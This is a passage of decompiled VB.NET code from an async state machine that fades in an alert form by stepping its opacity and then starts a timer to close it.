                ((comptableform) this).\u0024VB\u0024Local_o.Opacity = 1.0;
                // ISSUE: reference to a compiler-generated field
                ((alertform.VB\u0024StateMachine_39_FadeIn) ((comptableform) this).\u0024VB\u0024Me).Showtime = DateTime.Now.AddSeconds(5.0);
                ((comptableform) this).\u0024VB\u0024Me.closetimer.Start();
                break;
              }
label_8:
              taskAwaiter.GetResult();
              taskAwaiter = new TaskAwaiter();
              (((comptableform) this).\u0024S0 = ((comptableform) this).\u0024VB\u0024Local_o).Opacity = ((comptableform) this).\u0024S0.Opacity + 0.05;
              goto label_6;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ((comptableform) this).\u0024VB\u0024ResumableLocal_ex\u00241 = ex;
              ProjectData.ClearProjectError();
              break;
            }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        // ISSUE: reference to a compiler-generated field
        ((alertform.VB\u0024StateMachine_39_FadeIn) this).\u0024State = -2;
        ((comptableform) this).\u0024Builder.SetException(exception);
        ProjectData.ClearProjectError();
        return;
      }
      num = -2;
      // ISSUE: reference to a compiler-generated field
      ((alertform.VB\u0024StateMachine_39_FadeIn) this).\u0024State = -2;
      ((comptableform) this).\u0024Builder.SetResult();
    }
  }
}
